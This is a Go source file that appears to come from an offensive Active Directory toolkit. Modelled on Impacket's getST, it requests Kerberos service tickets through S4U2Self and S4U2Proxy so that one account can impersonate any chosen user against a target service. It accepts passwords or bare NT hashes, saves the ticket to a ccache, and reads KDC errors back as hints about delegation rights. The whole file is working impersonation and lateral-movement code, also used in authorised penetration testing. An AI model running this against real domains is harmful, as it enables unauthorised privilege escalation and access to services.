// Package getst requests service tickets via S4U2Self+S4U2Proxy
// (mirrors tools/getST's core impersonation flow).
package getst

import (
	"fmt"
	"strings"

	"github.com/mandiant/gopacket/pkg/kerberos"
	"github.com/mandiant/gopacket/pkg/session"
)

// Options carries the `anvil getst` inputs.
type Options struct {
	SPN         string // target service SPN (cifs/host.fqdn)
	Impersonate string // user to impersonate
	Domain      string // DNS realm
	DCIP        string // KDC override
	User        string // requesting account (e.g. a machine account from addcomputer)
	Password    string
	Hash        string // requesting account hashes, LM:NT or bare NT
	Out         string // ccache output path; empty = default
}

// Run validates opts, requests the service ticket via one KDC channel
// (opened once by pkg/kerberos' GetST), and writes it as a ccache,
// returning the path actually written.
func Run(opts Options) (string, error) {
	if opts.SPN == "" {
		return "", fmt.Errorf("-spn is required")
	}
	if opts.Impersonate == "" {
		return "", fmt.Errorf("-impersonate is required")
	}
	if opts.Domain == "" {
		return "", fmt.Errorf("-d is required (DNS realm, e.g. lab.local)")
	}
	if opts.User == "" {
		return "", fmt.Errorf("-u is required (the requesting account, e.g. a machine account)")
	}
	if opts.Password == "" && opts.Hash == "" {
		return "", fmt.Errorf("password (-p) or --hashes is required")
	}

	creds := &session.Credentials{
		Username: opts.User,
		Password: opts.Password,
		Domain:   opts.Domain,
		Hash:     opts.Hash,
		DCIP:     opts.DCIP,
	}

	result, err := kerberos.GetST(&kerberos.STRequest{
		Username:    creds.Username,
		Password:    creds.Password,
		Domain:      creds.Domain,
		NTHash:      ntHalf(creds.Hash),
		DCIP:        creds.DCIP,
		SPN:         opts.SPN,
		Impersonate: opts.Impersonate,
	})
	if err != nil {
		return "", mapS4UError(err)
	}

	out := opts.Out
	if out == "" {
		out = defaultOut(opts.Impersonate, opts.SPN)
	}
	if err := kerberos.SaveST(out, result); err != nil {
		return "", fmt.Errorf("save ticket: %v", err)
	}
	return out, nil
}

// defaultOut mirrors tools/getST's naming: <user>@<spn_with_underscores>.ccache
func defaultOut(user, spn string) string {
	return user + "@" + strings.ReplaceAll(spn, "/", "_") + ".ccache"
}

// SPNHost returns the host part of an SPN: cifs/host.fqdn:1433 → host.fqdn.
func SPNHost(spn string) string {
	rest := spn
	if i := strings.Index(rest, "/"); i >= 0 {
		rest = rest[i+1:]
	}
	if i := strings.Index(rest, ":"); i >= 0 {
		rest = rest[:i]
	}
	return rest
}

func ntHalf(h string) string {
	if i := strings.Index(h, ":"); i >= 0 {
		return h[i+1:]
	}
	return h
}

// mapS4UError renders the two common S4U denials as actionable messages
// (mirrors tools/getST's error interpretation).
func mapS4UError(err error) error {
	s := err.Error()
	switch {
	case strings.Contains(s, "KDC_ERR_S_PRINCIPAL_UNKNOWN") || strings.Contains(s, "error code 7:"):
		return fmt.Errorf("%v (no constrained-delegation rights on the requesting account, or the impersonated user does not exist)", s)
	case strings.Contains(s, "KDC_ERR_BADOPTION") || strings.Contains(s, "error code 13:"):
		return fmt.Errorf("%v (delegation not allowed — the SPN is not in the target's RBCD list, or the ticket is not forwardable)", s)
	}
	return err
}
